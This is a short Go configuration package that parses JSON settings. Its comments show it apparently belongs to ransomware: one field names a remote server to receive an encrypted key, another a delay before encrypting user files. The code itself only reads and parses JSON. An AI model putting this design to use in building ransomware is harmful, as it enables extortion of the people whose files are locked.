package config

import (
	"encoding/json"
	"io/ioutil"
)

type Config struct {
	// Remote server to push encrypted key to
	HTTPServer string

	// Time to wait in minutes before encrypting user files
	Wait int64
}

func Parse(filename string) (cfg Config, err error) {
	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return
	}

	if err = json.Unmarshal(b, &cfg); err != nil {
		return
	}
	return
}

func ParseBytes(b []byte) (cfg Config, err error) {
	if err = json.Unmarshal(b, &cfg); err != nil {
		return
	}
	return
}
